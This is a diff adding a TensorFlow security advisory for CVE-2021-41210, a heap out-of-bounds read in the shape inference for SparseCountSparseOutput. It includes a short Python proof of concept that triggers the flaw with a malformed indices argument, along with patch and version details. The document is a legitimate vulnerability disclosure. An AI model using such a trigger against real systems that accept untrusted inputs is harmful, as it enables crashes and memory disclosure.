@@ -1,0 +1,27 @@
+<h2>TFSA-2021-188: Heap OOB read in <code>tf.raw_ops.SparseCountSparseOutput</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-41210</p>
+<h3>Impact</h3>
+<p>The <a href="https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/ops/count_ops.cc#L43-L50">shape inference functions for <code>SparseCountSparseOutput</code></a> can trigger a read outside of bounds of heap allocated array:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>@tf.function
+def func():
+  return tf.raw_ops.SparseCountSparseOutput(
+    indices=[1],
+    values=[[1]],
+    dense_shape=[10],
+    weights=[],
+    binary_output= True)</p>
+<p>func()
+```</p>
+<p>The function fails to check that the first input (i.e., <code>indices</code>) has rank 2:</p>
+<p><code>cc
+  auto rank = c-&gt;Dim(c-&gt;input(0), 1);</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/701cfaca222a82afbeeb17496bd718baa65a67d2">701cfaca222a82afbeeb17496bd718baa65a67d2</a>.</p>
+<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>
